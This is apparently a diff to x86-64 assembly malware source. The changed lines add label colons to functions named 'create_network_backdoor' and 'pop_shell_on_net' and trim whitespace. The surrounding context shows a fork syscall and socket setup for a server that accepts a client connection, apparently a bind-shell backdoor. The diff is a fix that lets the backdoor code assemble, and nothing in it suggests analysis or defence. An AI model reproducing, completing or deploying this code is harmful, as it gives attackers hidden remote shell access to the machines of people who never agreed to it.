@@ -339,7 +339,7 @@ check_cmdline_content:
 retn
 
 ; void create_network_backdoor()
-create_network_backdoor
+create_network_backdoor:
 	mov rax, 57; fork
 	syscall;rax = fork()
 	cmp rax, 0
@@ -350,7 +350,7 @@ create_network_backdoor
 retn
 
 ;void pop_shell_on_net
-pop_shell_on_net
+pop_shell_on_net:
 	sub rsp, 16; struct sockaddr_in servaddr
 	sub rsp, 16; struct sockaddr_in cli
 	sub rsp, 12; int sockfd, connfd, len (4*3)
@@ -392,7 +392,7 @@ pop_shell_on_net
 	je exit_prog; err
 	mov DWORD[rsp + 4], eax
 	; at this point our server is running and has accepted a client
-	
+
 	add rsp, 12
 	add rsp, 32
 retn
